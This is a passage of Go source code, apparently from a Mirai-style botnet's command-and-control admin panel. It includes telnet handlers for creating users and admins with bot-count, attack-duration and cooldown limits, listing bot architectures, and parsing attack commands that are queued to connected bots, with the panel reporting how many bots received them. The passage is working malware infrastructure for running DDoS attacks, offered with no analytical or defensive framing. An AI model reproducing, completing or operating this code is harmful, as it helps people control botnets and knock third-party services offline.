            this.conn.Write([]byte("\033[95mCooldown\033[95m(\033[95m0 for none\033[95m)\033[95m:\033[95m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[95m%s\033[95m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[95m- New user info - \r\n- Username - \033[95m" + new_un + "\r\n\033[95m- Password - \033[95m" + new_pw + "\r\n\033[95m- Bots - \033[95m" + max_bots_str + "\r\n\033[95m- Max Duration - \033[95m" + duration_str + "\r\n\033[95m- Cooldown - \033[95m" + cooldown_str + "   \r\n\033[95mContinue? \033[95m(\033[01;32my\033[95m/\033[1;31mn\033[95m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[95m\r\n"))
            }
            continue
        }
		
		if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("\033[95mUsername:\033[95m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[95mPassword:\033[95m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[95mBotcount\033[95m(\033[95m-1 for access to all\033[95m)\033[95m:\033[95m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[95mAttack Duration\033[95m(\033[95m-1 for none\033[95m)\033[95m:\033[95m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[95mCooldown\033[95m(\033[95m0 for none\033[95m)\033[95m:\033[95m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[95m- New user info - \r\n- Username - \033[95m" + new_un + "\r\n\033[95m- Password - \033[95m" + new_pw + "\r\n\033[95m- Bots - \033[95m" + max_bots_str + "\r\n\033[95m- Max Duration - \033[95m" + duration_str + "\r\n\033[95m- Cooldown - \033[95m" + cooldown_str + "   \r\n\033[95mContinue? \033[95m(\033[01;32my\033[95m/\033[1;31mn\033[95m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[95m\r\n"))
            }
            continue
        }
		
		if userInfo.admin == 1 && cmd == "remove" {
            this.conn.Write([]byte("\033[95mUsername: \033[95m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[095mAre You Sure You Want To Remove \033[95m" + rm_un + "?\033[0;31m(\033[0;31my\033[0;31m/\033[1;31mn\033[0;31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[95mUser Successfully Removed!\r\n"))
            }
            continue
        }
		
        if userInfo.admin == 1 && cmd == "bots" || cmd == "arch" {
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[95m%s:\t%d\033[95m\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[95m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[95m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var YotCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        YotCount = userInfo.maxBots
                    } else {
                        YotCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("\033[0;1;31m[+] Command sent to \033[0;35m%d \033[0;1;31mbots\r\n", YotCount)))
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
